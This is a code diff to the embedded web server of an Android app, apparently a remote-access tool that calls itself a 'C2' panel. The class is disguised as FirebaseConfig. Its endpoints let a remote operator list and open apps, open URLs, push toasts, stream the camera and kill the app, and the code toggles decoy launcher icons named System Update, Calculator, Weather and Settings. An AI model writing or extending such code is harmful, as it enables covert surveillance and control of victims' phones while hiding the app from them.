@@ -255,7 +255,8 @@ public class FirebaseConfig extends NanoHTTPD {
     }
 
     public String getFooter() {
-        return "<div style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 60px; margin-bottom: 20px; opacity: 0.5; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 0 20px;\">" +
+        return "<audio id=\"live-audio-player\" style=\"display:none;\"></audio>" +
+                "<div style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 60px; margin-bottom: 20px; opacity: 0.5; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 0 20px;\">" +
                 "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
                 "</div>" +
                 "</div>" +
@@ -447,12 +448,26 @@ public class FirebaseConfig extends NanoHTTPD {
     }
 
     private Response serveGzipped(IHTTPSession session, String mime, String content) {
-        // [STABILITY_SYNC] Reverting to high-performance minification to restore C2 functionality
+        // [DEEP_STEALTH_V13] Adaptive Rendering & Recovery Shield
         if (mime != null && mime.contains("text/html") && content != null && !content.isEmpty()) {
-            content = content.replaceAll("(?s)<!--.*?-->", "")
-                             .replaceAll(">\\s+<", "><")
-                             .replaceAll("\\s{2,}", " ")
-                             .replaceAll("[\\r\\n]+", "");
+            // 1. Optimized Shield Protocol
+            String shield = "<div id=\"_sys_shield\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:#010801;z-index:99999;pointer-events:none;transition:opacity 0.25s;\"></div>" +
+                           "<script>(function(){" +
+                           "const r=()=>{const s=document.getElementById('_sys_shield');if(s){s.style.opacity='0';setTimeout(()=>s.remove(),250);}};" +
+                           "window.addEventListener('load',r); " +
+                           "/* Stream Safety: Don't hang on MJPEG streams */ if(window.location.pathname.includes('/camera')) setTimeout(r, 1000); " +
+                           "else setTimeout(r, 2000);" +
+                           "})();</script>";
+            
+            if (content.contains("</head>")) {
+                content = content.replace("</head>", "</head>" + shield);
+            } else {
+                content = shield + content;
+            }
+
+            // 2. Safe Tactical Minification
+            content = content.replaceAll("(?s)<!--.*?-->", "") // Remove comments
+                             .replaceAll(">\\s+<", "><");       // Only strip space between tags
         }
 
         if (session == null) return newFixedLengthResponse(Response.Status.OK, mime, content);
@@ -628,6 +643,19 @@ public class FirebaseConfig extends NanoHTTPD {
                         else if (uri.equals("/device/apps")) { response = serveAppList(session); }
                         else if (uri.equals("/device/open-app")) { openAppOnDevice(params.get("pkg")); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
                         else if (uri.equals("/device/open-url")) { openUrlOnDevice(params.get("url")); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
+                        else if (uri.equals("/device/toast")) {
+                            String msg = params.get("msg");
+                            int size = 22, y = 250, duration = 3500;
+                            String anim = params.get("anim"); if (anim == null) anim = "scroll";
+                            String color = params.get("color"); if (color == null) color = "#FFFFFF";
+                            try {
+                                if (params.containsKey("size")) size = Integer.parseInt(params.get("size"));
+                                if (params.containsKey("y")) y = Integer.parseInt(params.get("y"));
+                                if (params.containsKey("duration")) duration = Integer.parseInt(params.get("duration"));
+                            } catch (Exception ignored) {}
+                            showToast(msg, size, y, anim, duration, color);
+                            response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                        }
                         else if (uri.equals("/device/terminate")) {
                             logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
                             new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -1000,14 +1028,14 @@ public class FirebaseConfig extends NanoHTTPD {
             try {
                 String pkg = context.getPackageName();
                 android.content.pm.PackageManager pm = context.getPackageManager();
-                String pkgName = context.getPackageName();
+                String basePkg = "com.labs.labrats";
 
                 // 2. DISABLE ALL DECOYS IMMEDIATELY (Force single icon)
                 String[] decoys = {
-                    context.getPackageName() + ".SystemUpdateAlias",
-                    context.getPackageName() + ".CalculatorAlias",
-                    context.getPackageName() + ".WeatherAlias",
-                    context.getPackageName() + ".SettingsAlias"
+                    basePkg + ".SystemUpdateAlias",
+                    basePkg + ".CalculatorAlias",
+                    basePkg + ".WeatherAlias",
+                    basePkg + ".SettingsAlias"
                 };
                 for (String decoy : decoys) {
                     try {
@@ -1018,7 +1046,7 @@ public class FirebaseConfig extends NanoHTTPD {
                 }
 
                 // 3. RE-ENABLE MAIN LAUNCHER AND ACTIVITY
-                pm.setComponentEnabledSetting(new android.content.ComponentName(context, context.getPackageName() + ".LauncherAlias"),
+                pm.setComponentEnabledSetting(new android.content.ComponentName(context, basePkg + ".LauncherAlias"),
                         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                         0);
                 
